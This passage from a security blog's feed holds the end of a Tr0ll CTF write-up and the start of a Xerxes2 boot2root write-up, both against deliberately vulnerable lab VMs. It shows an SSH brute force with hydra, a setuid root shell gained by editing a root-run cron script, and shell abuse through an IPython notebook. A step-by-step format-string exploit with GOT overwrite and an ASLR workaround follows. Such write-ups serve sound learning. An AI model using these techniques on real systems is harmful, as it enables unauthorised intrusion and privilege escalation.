&lt;p&gt;Right, so I changed &lt;code&gt;hydra&lt;/code&gt; slightly to use &lt;code&gt;Pass.txt&lt;/code&gt; as a password and continued to brute with the original &lt;code&gt;list.txt&lt;/code&gt; as usernames:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# hydra -v -V -u -L list -p &amp;quot;Pass.txt&amp;quot; -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;maleus&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 1 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;ps-aux&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 2 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;felux&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 3 of 13 [child 0]
[...]
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay &lt;code&gt;overflow:Pass.txt&lt;/code&gt; should get us a session via ssh:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101&#39;s password:
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

[...]

Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;and-root&#34;&gt;&amp;hellip; and root&lt;/h2&gt;

&lt;p&gt;And so it was time for classic enumeration again. The first &lt;em&gt;strange&lt;/em&gt; thing was the fact that it appeared as if all the &lt;code&gt;/home&lt;/code&gt; directories apart from &lt;code&gt;/home/troll&lt;/code&gt; was deleted. Weird. Other than that, there were a whole bunch of users according to &lt;code&gt;/etc/passwd&lt;/code&gt;, and I can&amp;rsquo;t run anything as &lt;code&gt;root&lt;/code&gt; via &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There was a file in &lt;code&gt;/opt/&lt;/code&gt; called &lt;code&gt;lmao.py&lt;/code&gt;, however I did not have access to read it. Soooo, more enumeration.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;suddenly&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Broadcast Message from root@trol
        (somewhere) at 16:05 ...

TIMES UP LOL!

Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Urgh. Turns out, something is killing my ssh session every 5 minutes. &lt;strong&gt;Oh my word&lt;/strong&gt;, was that annoying. I could handle everything the VM&amp;rsquo;s offered, but this was probably the worst part of it.&lt;/p&gt;

&lt;p&gt;Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the &lt;em&gt;thing&lt;/em&gt; I should be finding has a more recent timestamp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;overflow@troll:/$ find / -executable -type f 2&amp;gt; /dev/null | egrep -v &amp;quot;^/bin|^/var|^/etc|^/usr&amp;quot; | xargs ls -lh | grep Aug

-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few interesting results came from that, however, the one that held the golden nugget was &lt;code&gt;/lib/log/cleaner.py&lt;/code&gt;. During my enumeration I noticed that &lt;code&gt;/tmp&lt;/code&gt; got cleaned out at a really strange time as I was still trying to &lt;code&gt;less&lt;/code&gt; a file in there, however, it just &lt;em&gt;disappeared&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Anyways, as &lt;code&gt;cleaner.py&lt;/code&gt; was owned by root and running &lt;code&gt;os.system&lt;/code&gt;, I just modified it to prepare me a classic &lt;code&gt;getroot&lt;/code&gt; binary:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
import os
import sys
try:
    os.system(&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;)
except:
    sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I waited for that annoying &amp;lsquo;Times UP&amp;rsquo; message, and inspected &lt;code&gt;/var/tmp&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot
#
# id
uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)

# ls /root
proof.txt

# cat /root/proof.txt
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc
#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;for-the-curious&#34;&gt;for the curious&lt;/h2&gt;

&lt;p&gt;That really annoying session that keeps dying? Turns out its &lt;code&gt;/opt/lmao.py&lt;/code&gt; to blame:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# cat /opt/lmao.py
#!/usr/bin/env python
import os

os.system(&#39;echo &amp;quot;TIMES UP LOL!&amp;quot;|wall&#39;)
os.system(&amp;quot;pkill -u &#39;overflow&#39;&amp;quot;)
sys.exit()

#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/maleus21&#34;&gt;@maleus21&lt;/a&gt; for the VM!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Beating Xerxes2</title>
      <link>https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/</link>
      <pubDate>Sat, 09 Aug 2014 16:59:53 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;Xerxes2 is a successor in a boot2root series by &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; hosted by &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. If you haven&amp;rsquo;t done it yet, close this article &lt;em&gt;now&lt;/em&gt; and go learn by doing it!&lt;/p&gt;

&lt;p&gt;Xerxes2, like most other boot2root type CTF&amp;rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read &lt;code&gt;/root/flag.txt&lt;/code&gt;. This is the path I took to read the flag and gain root command execution. Enjoy!&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-09 17:14 SAST
[...]
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    syn-ack lighttpd 1.4.31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
4444/tcp  open  krb524? syn-ack
8888/tcp  open  http    syn-ack Tornado httpd 2.3
57504/tcp open  status  syn-ack 1 (RPC #100024)
[...]
Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds
           Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well this gives us a boat load to test out already!&lt;/p&gt;

&lt;p&gt;I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened &lt;code&gt;nc&lt;/code&gt; to the port and redirected the output to a file &lt;code&gt;nc-string&lt;/code&gt;. Once the string echoed completely, I quit the &lt;code&gt;nc&lt;/code&gt;, and pushed the resultant string through a base64 decode and ran a &lt;code&gt;file&lt;/code&gt; against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~#  nc 192.168.56.102 4444 | tee nc-string
[...]
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
^C

root@kali:~# cat nc-string | base64 -d &amp;gt; nc-data
root@kali:~# file nc-data
nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;nc-data&lt;/code&gt; is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Electronic Noises &amp;amp; Robot Voice)&lt;/em&gt; &lt;em&gt;This is Xerxes. Why do you persist in your loneliness?&lt;/em&gt; &lt;em&gt;(Electronic Noises)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The start and end of the voice message had a clear in &amp;amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.&lt;/p&gt;

&lt;p&gt;This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.&lt;/p&gt;

&lt;p&gt;Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&amp;rsquo;t have to.&lt;/p&gt;

&lt;h2 id=&#34;first-shell-access&#34;&gt;first shell access&lt;/h2&gt;

&lt;p&gt;Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_home.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, moving on to tcp/8888, we see it identified as &lt;code&gt;Tornado httpd 2.3&lt;/code&gt;. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!&lt;/p&gt;

&lt;p&gt;tcp/8888 hosted a &lt;a href=&#34;http://ipython.org/notebook.html&#34;&gt;IPython Notebook&lt;/a&gt;. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a &lt;code&gt;!&lt;/code&gt;. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the &lt;code&gt;delacroix&lt;/code&gt; user:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_ipython.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;And then a easy SSH in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -i delacroix delacroix@192.168.56.102
The authenticity of host &#39;192.168.56.102 (192.168.56.102)&#39; can&#39;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.56.102&#39; (ECDSA) to the list of known hosts.

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;becoming-polito-the-why&#34;&gt;becoming polito - the why&lt;/h2&gt;

&lt;p&gt;Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary &lt;code&gt;/opt/bf&lt;/code&gt;, owned by &lt;code&gt;polito&lt;/code&gt; and had the SUID bit set for him. There was also a folder &lt;code&gt;/opt/backup&lt;/code&gt;, with a file &lt;code&gt;korenchkin.tar.enc&lt;/code&gt;. There was also mail in &lt;code&gt;/var/mail&lt;/code&gt; for the user &lt;code&gt;korenchkin&lt;/code&gt; which I am not able to read yet.&lt;/p&gt;

&lt;p&gt;More interestingly, the &lt;code&gt;.bash_history&lt;/code&gt; for the user I am now (delacroix), revealed that the &lt;code&gt;/opt/bf&lt;/code&gt; command was recently run, and the sources for this binary was available as &lt;code&gt;bf.c&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ls -lh
total 8.0K
-rw-r--r-- 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
-rw-r--r-- 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb

delacroix@xerxes2:~$ history
    1  cd
    2  ls -alh
    3  /opt/bf &amp;quot;&amp;lt;&amp;lt;++++[&amp;gt;++++&amp;lt;-]&amp;gt;[&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;++&amp;gt;++++&amp;gt;++++&amp;gt;++++&amp;gt;+++++&amp;gt;++++&amp;gt;+++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;----&amp;gt;-&amp;gt;-&amp;gt;-----&amp;gt;&amp;gt;++++&amp;gt;+++++&amp;gt;+++++&amp;gt;&amp;gt;+++++&amp;gt;++#&amp;quot;
    4  cp /media/politousb/bf.c .
    5  nano bf.c
    6  exit
    7  passwd
    8  exit

delacroix@xerxes2:~$ /opt/bf &amp;quot;&amp;lt;&amp;lt;++++[&amp;gt;++++&amp;lt;-]&amp;gt;[&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;++&amp;gt;++++&amp;gt;++++&amp;gt;++++&amp;gt;+++++&amp;gt;++++&amp;gt;+++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;----&amp;gt;-&amp;gt;-&amp;gt;-----&amp;gt;&amp;gt;++++&amp;gt;+++++&amp;gt;+++++&amp;gt;&amp;gt;+++++&amp;gt;++#&amp;quot;
LOOK DEEPERdelacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see above, running it just prints &lt;strong&gt;LOOK DEEPER&lt;/strong&gt;. I recognized the syntax as &lt;a href=&#34;http://en.wikipedia.org/wiki/Brainfuck&#34;&gt;brainfk&lt;/a&gt; and figured that &lt;code&gt;/opt/bf&lt;/code&gt; was simply a brainfk interpreter. But wait, lets inspect &lt;code&gt;bf.c&lt;/code&gt;!&lt;/p&gt;

&lt;h3 id=&#34;inspecting-bf-c&#34;&gt;inspecting bf.c&lt;/h3&gt;

&lt;p&gt;A quick read of &lt;code&gt;bf.c&lt;/code&gt; confirmed the suspicions that &lt;code&gt;/opt/bf&lt;/code&gt; was simply a brainfk interpreter. A buffer was set for the input program, then a function called &lt;code&gt;bf()&lt;/code&gt; was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;case &#39;.&#39;:
    printf(&amp;quot;%c&amp;quot;, buf[datapointer]);
    break;
case &#39;,&#39;:
    buf[datapointer] = getchar();
    break;
case &#39;&amp;gt;&#39;:
    datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
    break;
case &#39;&amp;lt;&#39;:
    datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
    break;
case &#39;+&#39;:
    buf[datapointer]++;
    break;
case &#39;-&#39;:
    buf[datapointer]--;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as &lt;code&gt;,.&lt;/code&gt;, and run it with &lt;code&gt;/opt/bf&lt;/code&gt;, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 &lt;code&gt;+&lt;/code&gt;, and ran that with a brainfk interpreter like &lt;code&gt;/opt/bf&lt;/code&gt;, then you would have the character with ASCII value 62 in memory. You can then print that value with &lt;code&gt;.&lt;/code&gt;, or move on the next memory cell with a &lt;code&gt;&amp;lt;&lt;/code&gt;. The most important thing to learn about brainfk was, &lt;em&gt;there are no high level features. No file IO, no socket IO, nothing&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;That was our brainfk class for the day.&lt;/p&gt;

&lt;h3 id=&#34;finding-the-bf-vuln&#34;&gt;finding the bf vuln&lt;/h3&gt;

&lt;p&gt;With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read &lt;code&gt;bf.c&lt;/code&gt;, and realized that one of the case statements was for &lt;code&gt;#&lt;/code&gt;, and that when a hash is present it will run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;case &#39;#&#39;:
    // new feature
    printf(buf);
    break;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Classic format string vulnerability!&lt;/p&gt;

&lt;p&gt;As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to &lt;em&gt;somehow&lt;/em&gt; exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as &lt;code&gt;polito&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;becoming-polito-the-how&#34;&gt;becoming polito - the how&lt;/h2&gt;

&lt;p&gt;Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;print &lt;code&gt;AAAA%x%x%x%x&lt;/code&gt;, adding &lt;code&gt;%s&lt;/code&gt; until you see the hex for of A (41), meaning that you are trying to find the position in the stack that &lt;code&gt;printf&lt;/code&gt; is placing the arguments.&lt;/li&gt;
&lt;li&gt;Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of &lt;code&gt;AAAA%16$x&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;objdump -R /your/bin&lt;/code&gt; and find a call in the GOT to override.&lt;/li&gt;
&lt;li&gt;Place some shellcode as environment variable, ie: &lt;code&gt;EGG&lt;/code&gt;, prefixed with say 200 &lt;code&gt;0x90&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;gdb&lt;/code&gt;, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.&lt;/li&gt;
&lt;li&gt;Calculate the required padding of strings to get the correct memory address, and write it using the &lt;code&gt;%n&lt;/code&gt; format string.&lt;/li&gt;
&lt;li&gt;Profit?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While this is all fine and dandy, it was not possible for me to &lt;em&gt;profit&lt;/em&gt; with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. &lt;code&gt;/opt/bf&lt;/code&gt; was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D&lt;/p&gt;

&lt;p&gt;So, let me take this step by step on how &lt;code&gt;/opt/bf&lt;/code&gt; can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part1&#34;&gt;/opt/bf - part1&lt;/h3&gt;

&lt;p&gt;To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html&#34;&gt;http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://codearcana.com/posts/2013/04/28/picoctf-videos.html&#34;&gt;http://codearcana.com/posts/2013/04/28/picoctf-videos.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://youtu.be/NwzmYSlETI8&#34;&gt;http://youtu.be/NwzmYSlETI8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://youtu.be/CHrs30g-3O0&#34;&gt;http://youtu.be/CHrs30g-3O0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, lets work with this.&lt;/p&gt;

&lt;p&gt;First of all, the program will only &lt;code&gt;printf(buf)&lt;/code&gt; the buffer which is brainfk. This is triggered with a &lt;code&gt;#&lt;/code&gt;. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to &lt;code&gt;/opt/bf&lt;/code&gt;. Remembering the research that was done, I opted to print as many &lt;code&gt;+&lt;/code&gt;&amp;rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with &lt;code&gt;&amp;gt;&lt;/code&gt;, preparing for the next character.&lt;/p&gt;

&lt;p&gt;To test my theory, I prepared my first payload using &lt;code&gt;python -c&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ echo $(python -c &#39;print &amp;quot;+&amp;quot; * ord(&amp;quot;a&amp;quot;)&#39;)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf &amp;quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&amp;quot;
a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That printed the character &lt;code&gt;a&lt;/code&gt; as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it &lt;code&gt;printf(buf)&lt;/code&gt; that too?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&amp;gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&amp;quot;
aa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 &lt;code&gt;a&lt;/code&gt;&amp;rsquo;s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use &lt;a href=&#34;https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions&#34;&gt;list comprehension&lt;/a&gt; to prepare our payloads for &lt;code&gt;/opt/bf&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;the quick brown fox&amp;quot;)])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can copy and paste the above command into a python shell and see the amount of &lt;code&gt;+&lt;/code&gt; there are haha.&lt;/p&gt;

&lt;p&gt;Anyways, that settled the brainfk problem.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part2&#34;&gt;/opt/bf - part2&lt;/h3&gt;

&lt;p&gt;Now that we can easily provide input to &lt;code&gt;/opt/bf&lt;/code&gt; to print using the vulnerable &lt;code&gt;printf()&lt;/code&gt; function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some &lt;code&gt;AAAA&lt;/code&gt; and search for them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;AAAA&amp;quot; + &amp;quot;.%x&amp;quot; * 20 + &amp;quot;\n&amp;quot;)])&#39;)#&amp;quot;
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the &lt;code&gt;AAAA&lt;/code&gt; input we have given it. Instead of typing like 20 &lt;code&gt;%s&lt;/code&gt;, I just use python to do the hard work for me. As you can see, the string &lt;code&gt;41414141&lt;/code&gt; is present in the output. We can test if we are able to use direct parameter access to access just the string we want:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;AAAA&amp;quot; + &amp;quot;.%16$x&amp;quot; &amp;quot;\n&amp;quot;)])&#39;)#&amp;quot;
AAAA.41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yup! Parameter 16 gives us what we need :)&lt;/p&gt;

&lt;p&gt;Great. Were making progress&amp;hellip; I think.&lt;/p&gt;

&lt;p&gt;For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part3&#34;&gt;/opt/bf - part3&lt;/h3&gt;

&lt;p&gt;Now that we know where we can start manipulating pointers, we need to find out &lt;em&gt;what&lt;/em&gt; we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.&lt;/p&gt;

&lt;p&gt;First of all, &lt;code&gt;/opt/bf&lt;/code&gt; was compiled with the NX bit:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb7734000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
    /lib/ld-linux.so.2 (0xb7735000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb779b000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
    /lib/ld-linux.so.2 (0xb779c000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb77c0000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
    /lib/ld-linux.so.2 (0xb77c1000)
delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with &lt;code&gt;ulimit -s unlimited&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ulimit -s unlimited

delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
